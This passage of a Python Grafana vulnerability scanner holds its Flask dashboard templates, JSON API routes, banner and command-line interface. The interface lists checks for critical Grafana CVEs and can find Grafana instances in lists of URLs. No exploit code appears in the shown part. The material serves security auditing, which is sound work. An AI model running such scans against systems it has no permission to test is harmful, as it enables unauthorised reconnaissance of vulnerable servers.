                            <td>{% if t.get('version') %}📌 v{{ t.get('version') }}{% else %}❓ unknown{% endif %}</td>
                            <td>{{ t.get('scan_count', 0) }} 🧪</td>
                            <td class="{% if t.get('total_vulnerabilities',0) > 0 %}status-open{% endif %}">{{ t.get('total_vulnerabilities', 0) }} {% if t.get('total_vulnerabilities',0) > 0 %}🔥{% else %}✅{% endif %}</td>
                            <td>
                                <div class="risk-meta">
                                    <span style="min-width: 45px; font-weight:600;">{{ t.get('risk_score', 0) }}</span>
                                    <div class="risk-bar">
                                        {% set score = t.get('risk_score', 0) %}
                                        <div class="risk-fill {% if score >= 50 %}risk-high{% elif score >= 20 %}risk-medium{% else %}risk-low{% endif %}" style="width: {{ score }}%;"></div>
                                    </div>
                                    <span style="font-size:0.7rem;">
                                        {% if score >= 70 %}⚠️ critical risk
                                        {% elif score >= 40 %}🧨 notable risk
                                        {% elif score >= 15 %}⚡ moderate
                                        {% else %}🍃 low risk
                                        {% endif %}
                                    </span>
                                </div>
                            </td>
                        </tr>
                        {% endfor %}
                    </tbody>
                </table>
            </div>
            {% else %}
            <div class="empty-state">
                <h3>📭 No targets in radar yet</h3>
                <p>Run a scan with <code>--db vulndb.json</code> and start monitoring your Grafana instances ✨</p>
            </div>
            {% endif %}
        
            <div class="insight-message" style="background: #16172a; border-left-color: #5e8aff;">
                <span>🤝💬</span>
                <div><strong>Pro tip:</strong> fixing critical flaws? Use the ✅ “Mark Fixed” button to clean your dashboard. Triage false positives with ❌ FP – keep your data actionable. Stay sharp!</div>
            </div>
        
            <div class="timestamp">
                🕒 Last sync: {{ now }} &nbsp;|&nbsp; 🧙‍♀️ security snapshot
            </div>
            <div class="footnote">
                💙 made for defenders — every patch makes the ecosystem safer
            </div>
        </div>
        
        <script>
            function updateStatus(vulnId, status) {
                if (!vulnId) {
                    console.warn("no vuln id provided");
                    return;
                }
                fetch('/api/vulnerabilities/' + vulnId + '/status', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ status: status })
                })
                .then(response => response.json())
                .then(data => {
                    if (data && data.success) {
                        location.reload();
                    } else {
                        console.log("Status update didn't succeed but reloading anyway");
                        location.reload();
                    }
                })
                .catch(err => {
                    console.error("API error", err);
                    setTimeout(() => location.reload(), 800);
                });
            }
        </script>
        </body>
        </html>
        ''', stats=stats, targets=targets, vulns=vulns, now=datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    
    @app.route('/targets')
    def targets_page():
        """Target management page"""
        targets = scanner.vulndb.get_all_targets() if scanner.vulndb else []
        return render_template_string('''
                <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
            <title>🎯 Grafana Scanner - Managed Targets</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { background: radial-gradient(circle at 10% 20%, #0c0c18, #070710); font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, 'SF Pro Text', 'Roboto', sans-serif; color: #eef2ff; line-height: 1.5; padding-bottom: 2rem; }
                ::-webkit-scrollbar { width: 8px; height: 8px; }
                ::-webkit-scrollbar-track { background: #1e1e2c; border-radius: 10px; }
                ::-webkit-scrollbar-thumb { background: #4a4a6a; border-radius: 10px; }
                ::-webkit-scrollbar-thumb:hover { background: #6c6c96; }
                .navbar { background: rgba(18, 18, 30, 0.85); backdrop-filter: blur(10px); padding: 0.9rem 2rem; display: flex; flex-wrap: wrap; align-items: center; gap: 1.2rem; border-bottom: 1px solid rgba(88, 88, 140, 0.3); box-shadow: 0 8px 20px rgba(0,0,0,0.3); }
                .navbar h1 { font-size: 1.65rem; font-weight: 700; background: linear-gradient(130deg, #ff7b7b, #ff3a3a); background-clip: text; -webkit-background-clip: text; color: transparent; letter-spacing: -0.3px; display: flex; align-items: center; gap: 8px; }
                .navbar a { color: #b9c3e6; text-decoration: none; padding: 8px 16px; border-radius: 40px; font-weight: 500; transition: all 0.2s ease; font-size: 0.9rem; display: inline-flex; align-items: center; gap: 6px; }
                .navbar a:hover, .navbar a.active { background: #2e2a4a; color: #ffffff; box-shadow: 0 2px 8px rgba(0,0,0,0.2); }
                .navbar a.active { background: #3c2e5e; border: 1px solid #a970ff50; }
                .container { max-width: 1400px; margin: 1.8rem auto 0 auto; padding: 0 1.8rem; }
                .section-title { font-size: 1.6rem; font-weight: 600; margin: 1rem 0 1.2rem 0; display: flex; align-items: center; gap: 12px; border-left: 5px solid #ff6a5c; padding-left: 1rem; }
                .subhead { color: #9ba7df; margin: -0.5rem 0 1.5rem 0; font-size: 0.9rem; }
                .table-wrapper { overflow-x: auto; border-radius: 20px; background: #11121e; border: 1px solid #2a2b40; margin-bottom: 2rem; box-shadow: 0 6px 14px rgba(0,0,0,0.3); }
                table { width: 100%; border-collapse: collapse; font-size: 0.9rem; }
                th { text-align: left; padding: 14px 16px; background: #16172b; color: #cdd6ff; font-weight: 600; font-size: 0.8rem; letter-spacing: 0.5px; text-transform: uppercase; border-bottom: 1px solid #2f314e; }
                td { padding: 12px 16px; border-bottom: 1px solid #23243e; vertical-align: middle; }
                tr:last-child td { border-bottom: none; }
                tr:hover td { background: #1c1d36; transition: 0.1s; }
                .badge { display: inline-flex; align-items: center; gap: 4px; padding: 2px 8px; border-radius: 40px; font-size: 0.65rem; font-weight: 700; background: #1e1f38; color: white; margin-left: 6px; }
                .badge-critical { background: #bc2f3e; }
                .badge-high { background: #e67e22; }
                .risk-bar { height: 8px; border-radius: 20px; background: #292b48; overflow: hidden; flex: 1; }
                .risk-fill { height: 100%; border-radius: 20px; transition: width 0.2s ease; }
                .risk-high { background: linear-gradient(90deg, #ff5e6e, #ff2e4a); }
                .risk-medium { background: linear-gradient(90deg, #fd9e4a, #ffbc6e); }
                .risk-low { background: linear-gradient(90deg, #50cc8a, #8effbc); }
                .empty-state { text-align: center; padding: 3rem 1.5rem; background: #10111e; border-radius: 32px; margin: 1rem 0; border: 1px dashed #4a4d74; }
                .empty-state h3 { font-size: 1.4rem; margin-bottom: 8px; }
                .empty-state p { color: #96a0d0; }
                a { color: #8eaeff; text-decoration: none; }
                a:hover { text-decoration: underline; color: #b7ceff; }
                code { background: #00000040; padding: 2px 8px; border-radius: 30px; font-size: 0.8rem; }
                .risk-meta { display: flex; align-items: center; gap: 10px; }
                .insight-message { background: #1d1e30; border-radius: 28px; padding: 0.8rem 1.5rem; margin-bottom: 2rem; display: flex; align-items: center; gap: 12px; border-left: 6px solid #ff9f4a; font-size: 0.9rem; }
                @media (max-width: 700px) { .container { padding: 0 1rem; } .navbar h1 { font-size: 1.3rem; } }
            </style>
        </head>
        <body>
            <div class="navbar">
                <h1><span>🛡️</span> Grafana Scanner </h1>
                <a href="/">📊 Dashboard</a>
                <a href="/targets" class="active">🎯 Targets</a>
                <a href="/vulnerabilities">⚠️ Vulns DB</a>
                <div style="margin-left: auto; font-size: 0.8rem; opacity: 0.7;">👋 hey, security hero</div>
            </div>
            <div class="container">
                <div class="insight-message">
                    <span>🗂️</span>
                    <span>Here are all your monitored Grafana instances. Click on any URL to inspect details.</span>
                </div>
                <div class="section-title">
                    <span>🎯📋</span> Tracked targets
                    <span style="font-size: 0.8rem; background: #2a1c2e; padding: 2px 12px; border-radius: 30px;">{{ targets|length }} total</span>
                </div>
                <div class="subhead">🔍 last seen, vulnerabilities & risk score per asset</div>
                {% if targets %}
                <div class="table-wrapper">
                    <table>
                        <thead>
                            <tr><th>🌍 Target URL</th><th>📦 Version</th><th>📅 First seen</th><th>🕒 Last scan</th><th>🔄 Scans</th><th>⚠️ Open Vulns</th><th>📈 Risk score</th></tr>
                        </thead>
                        <tbody>
                        {% for t in targets %}
                        <tr>
                            <td><a href="{{ t.get('url', '') }}" target="_blank">🗺️ {{ t.get('url', '')[:55] }}{% if t.get('url', '')|length > 55 %}..{% endif %}</a></td>
                            <td>{% if t.get('version') %}📌 v{{ t.get('version') }}{% else %}❓ unknown{% endif %}</td>
                            <td><small>{{ t.get('first_seen', '')[:10] }}</small></td>
                            <td><small>{{ t.get('last_scanned', '')[:10] }}</small></td>
                            <td>{{ t.get('scan_count', 0) }} 🧪</td>
                            <td>
                                {% set tv = t.get('total_vulnerabilities', 0) %}
                                <span {% if tv > 0 %}style="color:#ff7676;font-weight:bold"{% endif %}>{{ tv }} {% if tv > 0 %}🔥{% else %}✅{% endif %}</span>
                                {% if t.get('critical_count', 0) > 0 %}<span class="badge badge-critical">💀 C:{{ t.get('critical_count') }}</span>{% endif %}
                                {% if t.get('high_count', 0) > 0 %}<span class="badge badge-high">⚠️ H:{{ t.get('high_count') }}</span>{% endif %}
                            </td>
                            <td>
                                <div class="risk-meta">
                                    <span style="min-width: 45px; font-weight:600;">{{ t.get('risk_score', 0) }}</span>
                                    <div class="risk-bar">
                                        {% set score = t.get('risk_score', 0) %}
                                        <div class="risk-fill {% if score >= 50 %}risk-high{% elif score >= 20 %}risk-medium{% else %}risk-low{% endif %}" style="width: {{ score }}%;"></div>
                                    </div>
                                    <span style="font-size:0.7rem;">
                                        {% if score >= 70 %}⚠️ critical risk
                                        {% elif score >= 40 %}🧨 notable risk
                                        {% elif score >= 15 %}⚡ moderate
                                        {% else %}🍃 low risk
                                        {% endif %}
                                    </span>
                                </div>
                            </td>
                        </tr>
                        {% endfor %}
                        </tbody>
                    </table>
                </div>
                {% else %}
                <div class="empty-state">
                    <h3>📭 No targets in radar yet</h3>
                    <p>Run a scan with <code>--db vulndb.json</code> and start monitoring your Grafana instances ✨</p>
                </div>
                {% endif %}
                <div class="insight-message" style="background: #16172a; border-left-color: #5e8aff; margin-top: 1rem;">
                    <span>💡🧠</span>
                    <div><strong>Pro tip:</strong> Targets with “Critical” or “High” badges need immediate attention. Use the Dashboard to fix vulnerabilities or mark false positives.</div>
                </div>
            </div>
        </body>
        </html>
        ''', targets=targets)
    
    @app.route('/vulnerabilities')
    def vulnerabilities_page():
        """Vulnerability management page"""
        vulns = scanner.vulndb.get_all_vulnerabilities() if scanner.vulndb else []
        return render_template_string('''
                <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
            <title>⚠️ Grafana Scanner - Vulnerability </title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { background: radial-gradient(circle at 10% 20%, #0c0c18, #070710); font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, 'SF Pro Text', 'Roboto', sans-serif; color: #eef2ff; line-height: 1.5; padding-bottom: 2rem; }
                ::-webkit-scrollbar { width: 8px; height: 8px; }
                ::-webkit-scrollbar-track { background: #1e1e2c; border-radius: 10px; }
                ::-webkit-scrollbar-thumb { background: #4a4a6a; border-radius: 10px; }
                ::-webkit-scrollbar-thumb:hover { background: #6c6c96; }
                .navbar { background: rgba(18, 18, 30, 0.85); backdrop-filter: blur(10px); padding: 0.9rem 2rem; display: flex; flex-wrap: wrap; align-items: center; gap: 1.2rem; border-bottom: 1px solid rgba(88, 88, 140, 0.3); box-shadow: 0 8px 20px rgba(0,0,0,0.3); }
                .navbar h1 { font-size: 1.65rem; font-weight: 700; background: linear-gradient(130deg, #ff7b7b, #ff3a3a); background-clip: text; -webkit-background-clip: text; color: transparent; letter-spacing: -0.3px; display: flex; align-items: center; gap: 8px; }
                .navbar a { color: #b9c3e6; text-decoration: none; padding: 8px 16px; border-radius: 40px; font-weight: 500; transition: all 0.2s ease; font-size: 0.9rem; display: inline-flex; align-items: center; gap: 6px; }
                .navbar a:hover, .navbar a.active { background: #2e2a4a; color: #ffffff; box-shadow: 0 2px 8px rgba(0,0,0,0.2); }
                .navbar a.active { background: #3c2e5e; border: 1px solid #a970ff50; }
                .container { max-width: 1400px; margin: 1.8rem auto 0 auto; padding: 0 1.8rem; }
                .section-title { font-size: 1.6rem; font-weight: 600; margin: 1rem 0 1.2rem 0; display: flex; align-items: center; gap: 12px; border-left: 5px solid #ff6a5c; padding-left: 1rem; }
                .subhead { color: #9ba7df; margin: -0.5rem 0 1.5rem 0; font-size: 0.9rem; }
                .filters { display: flex; gap: 10px; margin-bottom: 1.5rem; flex-wrap: wrap; }
                .filters select, .filters input { background: #1e1f36; color: #eef2ff; border: 1px solid #3a3c60; padding: 8px 14px; border-radius: 40px; font-size: 0.85rem; cursor: pointer; }
                .table-wrapper { overflow-x: auto; border-radius: 20px; background: #11121e; border: 1px solid #2a2b40; margin-bottom: 2rem; box-shadow: 0 6px 14px rgba(0,0,0,0.3); }
                table { width: 100%; border-collapse: collapse; font-size: 0.9rem; }
                th { text-align: left; padding: 14px 16px; background: #16172b; color: #cdd6ff; font-weight: 600; font-size: 0.8rem; letter-spacing: 0.5px; text-transform: uppercase; border-bottom: 1px solid #2f314e; }
                td { padding: 12px 16px; border-bottom: 1px solid #23243e; vertical-align: middle; }
                tr:last-child td { border-bottom: none; }
                tr:hover td { background: #1c1d36; transition: 0.1s; }
                .badge { display: inline-flex; align-items: center; gap: 6px; padding: 4px 12px; border-radius: 40px; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.4px; background: #1e1f38; color: white; }
                .severity-critical { background: #bc2f3e; box-shadow: 0 0 6px #ff4d6d; }
                .severity-high { background: #e67e22; }
                .severity-medium { background: #e9b741; color: #1f1f2a; }
                .severity-low { background: #3c91e6; }
                .status-open { background: #bc2f3e; color: #fff; padding: 4px 10px; border-radius: 40px; font-size: 0.7rem; font-weight: 600; display: inline-flex; align-items: center; gap: 5px; }
                .status-fixed { background: #2b7a3e; color: #fff; padding: 4px 10px; border-radius: 40px; font-size: 0.7rem; font-weight: 600; display: inline-flex; align-items: center; gap: 5px; }
                .status-false_positive { background: #b9772e; color: #fff; padding: 4px 10px; border-radius: 40px; font-size: 0.7rem; font-weight: 600; display: inline-flex; align-items: center; gap: 5px; }
                .status-accepted { background: #6c757d; color: #fff; padding: 4px 10px; border-radius: 40px; font-size: 0.7rem; font-weight: 600; display: inline-flex; align-items: center; gap: 5px; }
                .actions { display: flex; gap: 8px; flex-wrap: wrap; }
                .btn { padding: 6px 12px; border: none; border-radius: 40px; font-size: 0.7rem; font-weight: 600; cursor: pointer; transition: 0.15s; display: inline-flex; align-items: center; gap: 6px; background: #2a2c48; color: #f0f3ff; }
                .btn-fix { background: #2b7a3e; }
                .btn-fix:hover { background: #3e9a57; transform: scale(0.96); }
                .btn-fp { background: #b9772e; }
                .btn-fp:hover { background: #da9246; transform: scale(0.96); }
                .btn-accept { background: #6c757d; }
                .btn-accept:hover { background: #8a96a3; transform: scale(0.96); }
                .btn-reopen { background: #2a2c48; }
                .btn-reopen:hover { background: #4a4d74; transform: scale(0.96); }
                a { color: #8eaeff; text-decoration: none; }
                a:hover { text-decoration: underline; color: #b7ceff; }
                code { background: #00000040; padding: 2px 8px; border-radius: 30px; font-size: 0.8rem; }
                .empty-state { text-align: center; padding: 3rem 1.5rem; background: #10111e; border-radius: 32px; margin: 1rem 0; border: 1px dashed #4a4d74; }
                .empty-state h3 { font-size: 1.4rem; margin-bottom: 8px; }
                .empty-state p { color: #96a0d0; }
                .insight-message { background: #1d1e30; border-radius: 28px; padding: 0.8rem 1.5rem; margin-bottom: 2rem; display: flex; align-items: center; gap: 12px; border-left: 6px solid #ff9f4a; font-size: 0.9rem; }
                @media (max-width: 700px) { .container { padding: 0 1rem; } .navbar h1 { font-size: 1.3rem; } }
            </style>
        </head>
        <body>
            <div class="navbar">
                <h1><span>🛡️</span> Grafana Scanner </h1>
                <a href="/">📊 Dashboard</a>
                <a href="/targets">🎯 Targets</a>
                <a href="/vulnerabilities" class="active">⚠️ Vulns DB</a>
                <div style="margin-left: auto; font-size: 0.8rem; opacity: 0.7;">👋 hey, security hero</div>
            </div>
            <div class="container">
                <div class="insight-message">
                    <span>🗄️</span>
                    <span>Full list of discovered vulnerabilities. Filter by severity or status, then take action.</span>
                </div>
                <div class="section-title">
                    <span>📋⚠️</span> Vulnerability registry
                    <span style="font-size: 0.8rem; background: #2a1c2e; padding: 2px 12px; border-radius: 30px;">{{ vulns|length }} total</span>
                </div>
                <div class="subhead">🔍 track, triage, and manage every finding</div>
                <div class="filters">
                    <select id="severityFilter" onchange="filterTable()">
                        <option value="all">🔽 All severities</option>
                        <option value="CRITICAL">🔥 Critical</option>
                        <option value="HIGH">🟠 High</option>
                        <option value="MEDIUM">🟡 Medium</option>
                        <option value="LOW">🔵 Low</option>
                    </select>
                    <select id="statusFilter" onchange="filterTable()">
                        <option value="all">📌 All statuses</option>
                        <option value="open">⚠️ Open</option>
                        <option value="fixed">✅ Fixed</option>
                        <option value="false_positive">❌ False Positive</option>
                        <option value="accepted">📝 Accepted risk</option>
                    </select>
                    <input type="text" id="searchInput" placeholder="🔎 Search by CVE or target..." onkeyup="filterTable()">
                </div>
                {% if vulns %}
                <div class="table-wrapper">
                    <table id="vulnTable">
                        <thead>
                            <tr><th>🎯 Target</th><th>🔖 CVE ID</th><th>💥 Severity</th><th>📌 Status</th><th>📅 Discovered</th><th>🛠️ Actions</th></tr>
                        </thead>
                        <tbody>
                        {% for v in vulns %}
                        <tr class="vuln-row" data-severity="{{ v.get('severity', 'LOW') }}" data-status="{{ v.get('status', 'open') }}" data-cve="{{ v.get('cve_id', '') }}" data-target="{{ v.get('target_url', '') }}">
                            <td><a href="{{ v.get('target_url', '') }}" target="_blank">🌐 {{ v.get('target_url', '')[:50] }}{% if v.get('target_url', '')|length > 50 %}..{% endif %}</a></td>
                            <td><code>{{ v.get('cve_id', 'N/A') }}</code></td>
                            <td><span class="badge severity-{{ v.get('severity', 'low').lower() }}">{% if v.get('severity') == 'CRITICAL' %}🔥{% elif v.get('severity') == 'HIGH' %}⚠️{% elif v.get('severity') == 'MEDIUM' %}🟡{% else %}🔵{% endif %} {{ v.get('severity', 'LOW') }}</span></td>
                            <td>
                                <span class="status-{{ v.get('status', 'open') }}">
                                    {% if v.get('status') == 'open' %}⚠️ Open
                                    {% elif v.get('status') == 'fixed' %}✅ Fixed
                                    {% elif v.get('status') == 'false_positive' %}❌ False Positive
                                    {% elif v.get('status') == 'accepted' %}📝 Accepted
                                    {% else %}{{ v.get('status') }}{% endif %}
                                </span>
                            </td>
                            <td><small>{{ v.get('discovered', '')[:10] }}</small></td>
                            <td>
                                <div class="actions">
                                    {% if v.get('status') == 'open' %}
                                    <button class="btn btn-fix" onclick="updateStatus('{{ v.get('id', '') }}', 'fixed')">✅ Mark Fixed</button>
                                    <button class="btn btn-fp" onclick="updateStatus('{{ v.get('id', '') }}', 'false_positive')">❌ False Positive</button>
                                    <button class="btn btn-accept" onclick="updateStatus('{{ v.get('id', '') }}', 'accepted')">📝 Accept Risk</button>
                                    {% else %}
                                    <button class="btn btn-reopen" onclick="updateStatus('{{ v.get('id', '') }}', 'open')">🔄 Reopen</button>
                                    {% endif %}
                                </div>
                            </td>
                        </tr>
                        {% endfor %}
                        </tbody>
                    </table>
                </div>
                {% else %}
                <div class="empty-state">
                    <h3>✅ No vulnerabilities recorded</h3>
                    <p>Run a scan to populate the vulnerability database.</p>
                </div>
                {% endif %}
                <div class="insight-message" style="background: #16172a; border-left-color: #5e8aff; margin-top: 1rem;">
                    <span>🧠💡</span>
                    <div><strong>Pro tip:</strong> Use filters to focus on critical or open issues. Mark fixed vulnerabilities to clean up your backlog, or accept risk when mitigation isn't planned.</div>
                </div>
            </div>
            <script>
                function updateStatus(vulnId, status) {
                    if (!vulnId) return;
                    fetch('/api/vulnerabilities/' + vulnId + '/status', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ status: status })
                    })
                    .then(r => r.json())
                    .then(d => { if (d.success) location.reload(); })
                    .catch(() => setTimeout(() => location.reload(), 800));
                }
                function filterTable() {
                    const severity = document.getElementById('severityFilter').value;
                    const status = document.getElementById('statusFilter').value;
                    const search = document.getElementById('searchInput').value.toLowerCase();
                    const rows = document.querySelectorAll('.vuln-row');
                    rows.forEach(row => {
                        let show = true;
                        const rowSeverity = row.getAttribute('data-severity');
                        const rowStatus = row.getAttribute('data-status');
                        const rowCve = row.getAttribute('data-cve').toLowerCase();
                        const rowTarget = row.getAttribute('data-target').toLowerCase();
                        if (severity !== 'all' && rowSeverity !== severity) show = false;
                        if (status !== 'all' && rowStatus !== status) show = false;
                        if (search && !rowCve.includes(search) && !rowTarget.includes(search)) show = false;
                        row.style.display = show ? '' : 'none';
                    });
                }
            </script>
        </body>
        </html>
        ''', vulns=vulns)
    
    @app.route('/api/vulnerabilities/<vuln_id>/status', methods=['POST'])
    def update_vuln_status(vuln_id):
        """API endpoint to update vulnerability status"""
        data = request.get_json()
        if not data or 'status' not in data:
            return jsonify({'success': False, 'error': 'Missing status'}), 400
        
        result = scanner.vulndb.update_vuln_status(vuln_id, data['status'], data.get('notes', ''))
        if result:
            return jsonify({'success': True})
        return jsonify({'success': False, 'error': 'Vulnerability not found'}), 404
    
    @app.route('/api/stats')
    def api_stats():
        """API endpoint for statistics"""
        stats = scanner.vulndb.get_statistics() if scanner.vulndb else {}
        return jsonify(stats)
    
    @app.route('/api/targets')
    def api_targets():
        """API endpoint for targets list"""
        targets = scanner.vulndb.get_all_targets() if scanner.vulndb else []
        return jsonify(targets)
    
    @app.route('/api/vulnerabilities')
    def api_vulnerabilities():
        """API endpoint for vulnerabilities list"""
        vulns = scanner.vulndb.get_all_vulnerabilities() if scanner.vulndb else []
        return jsonify(vulns)
    
    return app


# =====================================================================
#  BANNER
# =====================================================================

def print_banner():
    """Display professional tool banner"""
    banner = f"""
{Colors.CRITICAL}    ╔═══════════════════════════════════════════════════════════════╗
    ║{Colors.RESET}   {Colors.BOLD}{Colors.SUCCESS}███████{Colors.RESET}{Colors.CRITICAL}╗{Colors.RESET}{Colors.BOLD}{Colors.SUCCESS}██████{Colors.RESET}{Colors.CRITICAL}╗{Colors.RESET}{Colors.BOLD}{Colors.SUCCESS}████████{Colors.RESET}{Colors.CRITICAL}╗{Colors.RESET}{Colors.BOLD}{Colors.SUCCESS}███████{Colors.RESET}{Colors.CRITICAL}╗{Colors.RESET}{Colors.BOLD}{Colors.SUCCESS}██{Colors.RESET}{Colors.CRITICAL}╗{Colors.RESET}{Colors.BOLD}{Colors.SUCCESS}██{Colors.RESET}{Colors.CRITICAL}╗{Colors.RESET}{Colors.BOLD}{Colors.SUCCESS}██{Colors.RESET}{Colors.CRITICAL}╗     {Colors.RESET}{Colors.BOLD}{Colors.INFO}╔══╗{Colors.RESET}{Colors.CRITICAL}║
    ║{Colors.RESET}   {Colors.BOLD}{Colors.SUCCESS}██╔════╝██╔══████╔════╝██╔════╝██║██╔██╗██║     {Colors.RESET}{Colors.BOLD}{Colors.INFO}║  ║{Colors.RESET}{Colors.CRITICAL}║
    ║{Colors.RESET}   {Colors.BOLD}{Colors.SUCCESS}█████╗  ██████╔███████╗█████╗  ██║████╗ ██║     {Colors.RESET}{Colors.BOLD}{Colors.CYAN}╠╝  ╚╣{Colors.RESET}{Colors.CRITICAL}║
    ║{Colors.RESET}   {Colors.BOLD}{Colors.SUCCESS}██╔══╝  ██╔══██╔══██║██╔══╝  ██║██║╚██╗██║     {Colors.RESET}{Colors.BOLD}{Colors.CYAN}║   ╔╝{Colors.RESET}{Colors.CRITICAL}║
    ║{Colors.RESET}   {Colors.BOLD}{Colors.SUCCESS}██║     ██║  ███████║███████╗██║██║ ╚████║     {Colors.RESET}{Colors.BOLD}{Colors.INFO}║   ╚╗{Colors.RESET}{Colors.CRITICAL}║
    ║{Colors.RESET}   {Colors.BOLD}{Colors.SUCCESS}╚═╝     ╚═╝  ╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝     {Colors.RESET}{Colors.BOLD}{Colors.INFO}╩═══╝{Colors.RESET}{Colors.CRITICAL}║
    ║{Colors.RESET}                                                              {Colors.CRITICAL}║
    ║{Colors.RESET}   {Colors.BOLD}{Colors.PURPLE}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{Colors.RESET}{Colors.CRITICAL}║
    ║{Colors.RESET}   {Colors.BOLD}{Colors.CYAN}GRAFANA FINAL SCANNER{Colors.RESET}    {Colors.DIM}Professional Security Audit Suite{Colors.RESET}     {Colors.CRITICAL}║
    ║{Colors.RESET}   {Colors.DIM}v3.0.0 | 15 CVE Checks | Multi-Format Reports | Web Dashboard{Colors.RESET} {Colors.CRITICAL}║
    ║{Colors.RESET}   {Colors.DIM}Developed by: Ziad{Colors.RESET}                                         {Colors.CRITICAL}║
    ╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)


# =====================================================================
#  CLI ENTRY POINT
# =====================================================================

def main():
    """Main execution flow"""
    
    parser = argparse.ArgumentParser(
        description='Grafana Final Scanner - Professional Vulnerability Assessment Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f'''
{Colors.BOLD}USAGE EXAMPLES:{Colors.RESET}
  python {sys.argv[0]} -u https://grafana.target.com
  python {sys.argv[0]} -f targets.txt -o report
  python {sys.argv[0]} -u https://grafana.target.com --no-ssl-verify -v
  python {sys.argv[0]} --auto-search urls.txt -o discovery_report
  python {sys.argv[0]} -f targets.txt --db vulndb.json
  python {sys.argv[0]} --serve --db vulndb.json

{Colors.BOLD}NEW FEATURES:{Colors.RESET}
  --auto-search FILE    Auto-detect Grafana instances from file containing mixed URLs
  --db FILE             Enable vulnerability/target management with JSON database
  --serve [PORT]        Start web dashboard (requires Flask, uses --db)
  --no-banner           Suppress banner display

{Colors.BOLD}TESTED VULNERABILITIES:{Colors.RESET}
  {Colors.CRITICAL}CRITICAL:{Colors.RESET}
    • CVE-2025-4123 - Path Traversal & Open Redirect XSS
    • CVE-2024-9264 - DuckDB SQL Injection (RCE)
    • CVE-2024-8118 - OAuth Authentication Bypass
    • CVE-2021-43798 - Directory Traversal (Arbitrary File Read)

  {Colors.HIGH}HIGH:{Colors.RESET}
    • CVE-2023-50164 - Plugin Path Traversal
    • CVE-2023-1410 - SSRF via Data Source Proxy
    • CVE-2023-2183 - Authentication Bypass
    • CVE-2018-15727 - Authentication Bypass (Cookie Forging)
    • CVE-2021-27358 - DoS via Snapshots API

  {Colors.MEDIUM}MEDIUM:{Colors.RESET}
    • CVE-2024-1313 - Information Disclosure
    • CVE-2020-11110 - Stored XSS
    • CVE-2021-41174 - AngularJS XSS
    • CVE-2021-39226 - Snapshot Enumeration

{Colors.BOLD}FEATURES:{Colors.RESET}
  • Auto-search Grafana detection from mixed URL lists
  • Multi-source version detection (7+ endpoints)
  • Version-aware vulnerability filtering
  • Configuration security analysis (CORS, headers, plugins, anonymous access)
  • Vulnerability management with persistent JSON database
  • Target management with scan history & risk scoring
  • Built-in web dashboard (Flask) for results viewing
  • Authentication support (Bearer token & Basic auth)
  • Multi-format reporting (JSON, HTML, CSV)
  • Parallel scanning with configurable threads
  • Rate limiting detection and handling
  • Color-coded severity indicators

{Colors.DIM}For more information, see README.md{Colors.RESET}
        '''
    )
    
    parser.add_argument('-u', '--url', help='Single target URL to scan')
    parser.add_argument('-f', '--file', help='File containing list of targets (one per line)')
    parser.add_argument('--auto-search', metavar='FILE', help='Auto-detect Grafana instances from file containing mixed URLs')
    parser.add_argument('-o', '--output', help='Save detailed report (JSON, HTML, CSV) to file (extension auto-added)')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='HTTP request timeout in seconds (default: 10)')
    parser.add_argument('--no-ssl-verify', action='store_true', help='Disable SSL certificate verification')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output (show all checks)')
    parser.add_argument('--auth-token', help='Bearer token for authenticated scanning')
    parser.add_argument('--auth-user', help='Username for basic authentication')
    parser.add_argument('--auth-pass', help='Password for basic authentication')
    parser.add_argument('--threads', type=_positive_int, default=5, help='Max threads for parallel scanning (default: 5)')
    parser.add_argument('--db', metavar='FILE', help='Enable vulnerability management with JSON database file')
    parser.add_argument('--serve', nargs='?', const=8080, type=int, default=None, metavar='PORT',
                       help='Start web dashboard on specified port (default: 8080)')
    parser.add_argument('--no-banner', action='store_true', help='Suppress banner display')
    parser.add_argument('--host', default='127.0.0.1', help='Host to bind web server to (default: 127.0.0.1)')
    
    args = parser.parse_args()
    
    if not args.no_banner:
        print_banner()
    
    if not args.url and not args.file and not args.auto_search and args.serve is None:
        parser.print_help()
        sys.exit(1)
    
    # Initialize scanner
    scanner = GrafanaFinalScanner(
        timeout=args.timeout,
        verify_ssl=not args.no_ssl_verify,
        verbose=args.verbose,
        auth_token=args.auth_token,
        auth_user=args.auth_user,
        auth_pass=args.auth_pass,
        max_threads=args.threads,
        db_path=args.db
    )
    
    # Web server mode
    if args.serve is not None:
        if not FLASK_AVAILABLE:
            print(f"\n{Colors.CRITICAL}[!] Flask is required for web server mode.{Colors.RESET}")
            print(f"{Colors.INFO}[*] Install with: pip install flask{Colors.RESET}")
            sys.exit(1)
        
        if not args.db:
            print(f"\n{Colors.WARN}[!] Web server mode requires --db flag{Colors.RESET}")
            print(f"{Colors.INFO}[*] Usage: {sys.argv[0]} --serve --db vulndb.json{Colors.RESET}")
            sys.exit(1)
        
        print(f"\n{Colors.INFO}[*] Starting web dashboard on {Colors.BOLD}http://{args.host}:{args.serve}{Colors.RESET}")
        print(f"{Colors.DIM}[*] Press Ctrl+C to stop the server{Colors.RESET}\n")
        
        app = create_web_server(scanner, host=args.host, port=args.serve)
        
        # Clean shutdown
        def shutdown():
            print(f"\n{Colors.WARN}[!] Web server shutting down...{Colors.RESET}")
        signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
